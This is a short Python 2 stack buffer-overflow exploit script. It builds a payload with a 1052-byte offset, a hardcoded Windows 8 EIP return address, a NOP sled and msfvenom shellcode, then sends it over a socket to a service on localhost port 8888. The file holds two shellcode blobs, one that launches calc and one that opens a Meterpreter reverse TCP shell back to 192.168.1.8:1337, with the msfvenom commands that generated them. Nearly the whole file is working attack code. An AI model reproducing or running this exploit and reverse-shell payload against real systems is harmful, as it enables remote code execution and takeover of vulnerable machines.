import socket

#offset 1052



#msfvenom -p windows/exec CMD=calc -b "\x00\x0a\x0d" -f c
calc=("\xb8\xdf\x1b\xc9\xa4\xda\xd0\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x30\x31\x43\x13\x83\xc3\x04\x03\x43\xd0\xf9\x3c\x58\x06\x7f"
"\xbe\xa1\xd6\xe0\x36\x44\xe7\x20\x2c\x0c\x57\x91\x26\x40\x5b"
"\x5a\x6a\x71\xe8\x2e\xa3\x76\x59\x84\x95\xb9\x5a\xb5\xe6\xd8"
"\xd8\xc4\x3a\x3b\xe1\x06\x4f\x3a\x26\x7a\xa2\x6e\xff\xf0\x11"
"\x9f\x74\x4c\xaa\x14\xc6\x40\xaa\xc9\x9e\x63\x9b\x5f\x95\x3d"
"\x3b\x61\x7a\x36\x72\x79\x9f\x73\xcc\xf2\x6b\x0f\xcf\xd2\xa2"
"\xf0\x7c\x1b\x0b\x03\x7c\x5b\xab\xfc\x0b\x95\xc8\x81\x0b\x62"
"\xb3\x5d\x99\x71\x13\x15\x39\x5e\xa2\xfa\xdc\x15\xa8\xb7\xab"
"\x72\xac\x46\x7f\x09\xc8\xc3\x7e\xde\x59\x97\xa4\xfa\x02\x43"
"\xc4\x5b\xee\x22\xf9\xbc\x51\x9a\x5f\xb6\x7f\xcf\xed\x95\x15"
"\x0e\x63\xa0\x5b\x10\x7b\xab\xcb\x79\x4a\x20\x84\xfe\x53\xe3"
"\xe1\xf1\x19\xae\x43\x9a\xc7\x3a\xd6\xc7\xf7\x90\x14\xfe\x7b"
"\x11\xe4\x05\x63\x50\xe1\x42\x23\x88\x9b\xdb\xc6\xae\x08\xdb"
"\xc2\xcc\xcf\x4f\x8e\x12")




# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=1337 -b "\x00\x0a\x0d" -f c
reverse_shell=("\xbd\x54\x9a\xab\x97\xdb\xc7\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x59\x31\x6b\x14\x03\x6b\x14\x83\xeb\xfc\xb6\x6f\x57\x7f\xb9"
"\x90\xa8\x80\xa5\xa1\x7a\x09\xc0\xa6\xf1\x58\x3a\xac\x54\x51"
"\xb1\xe0\x4c\xe2\xb7\x2c\x62\x43\x7d\x0b\x4d\x54\xb0\x93\x01"
"\x96\xd3\x6f\x58\xcb\x33\x51\x93\x1e\x32\x96\x65\x54\xdb\x4a"
"\xfd\xc4\x33\x3c\x8a\xab\x0f\xc3\x5c\xa0\x2f\xbb\xd9\x77\xdb"
"\x77\xe3\xa7\xa8\xc0\xfb\x17\x25\x88\xdb\x96\xea\xac\xd5\xed"
"\x30\xe6\xd4\xf2\xc3\xcc\x9d\x0c\x05\x1d\x62\xa2\x68\x91\x6f"
"\xba\xad\x16\x90\xc9\xc5\x64\x2d\xca\x1e\x16\xe9\x5f\x80\xb0"
"\x7a\xc7\x64\x40\xae\x9e\xef\x4e\x1b\xd4\xb7\x52\x9a\x39\xcc"
"\x6f\x17\xbc\x02\xe6\x63\x9b\x86\xa2\x30\x82\x9f\x0e\x96\xbb"
"\xff\xf7\x47\x1e\x74\x15\x91\x1e\x75\xe5\x9e\x42\xe1\x29\x53"
"\x7d\xf1\x25\xe4\x0e\xc3\xea\x5e\x99\x6f\x62\x79\x5e\xe6\x64"
"\x7a\xb0\x40\xe4\x84\x31\xb0\x2c\x43\x65\xe0\x46\x62\x06\x6b"
"\x97\x8b\xd3\x01\x9d\x1b\x1c\x7d\xa0\xd3\xf4\x7f\xa3\xe6\x3d"
"\xf6\x45\xb8\x6d\x58\xda\x79\xde\x18\x8a\x11\x34\x97\xf5\x02"
"\x37\x72\x9e\xa9\xd8\x2a\xf6\x45\x40\x77\x8c\xf4\x8d\xa2\xe8"
"\x37\x05\x46\x0c\xf9\xee\x23\x1e\xee\x88\xcb\xde\xef\x3c\xcb"
"\xb4\xeb\x96\x9c\x20\xf6\xcf\xea\xee\x09\x3a\x69\xe8\xf6\xbb"
"\x5b\x82\xc1\x29\xe3\xfc\x2d\xbe\xe3\xfc\x7b\xd4\xe3\x94\xdb"
"\x8c\xb0\x81\x23\x19\xa5\x19\xb6\xa2\x9f\xce\x11\xcb\x1d\x28"
"\x55\x54\xde\x1f\xe5\x93\x20\xdd\xc2\x3b\x48\x1d\x53\xbc\x88"
"\x77\x53\xec\xe0\x8c\x7c\x03\xc0\x6d\x57\x4c\x48\xe7\x36\x3e"
"\xe9\xf8\x12\x9e\xb7\xf9\x91\x3b\x48\x83\xda\xbc\xa9\x74\xf3"
"\xd8\xaa\x74\xfb\xde\x97\xa2\xc2\x94\xd6\x76\x71\xa6\x6d\xda"
"\xd0\x2d\x8d\x48\x22\x64")



total_size=1700


win_8_eip="\xa7\xf6\x8b\x77"
eip="\x17\x91\x61\x6d"
payload="A"*1052 + win_8_eip + "\x90"*10+calc+"C"*(total_size-1056-len(calc)-10)



s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
	s.connect(("127.0.0.1",8888))
	s.send(payload)
except Exception as e:
	print "not connected!!!"
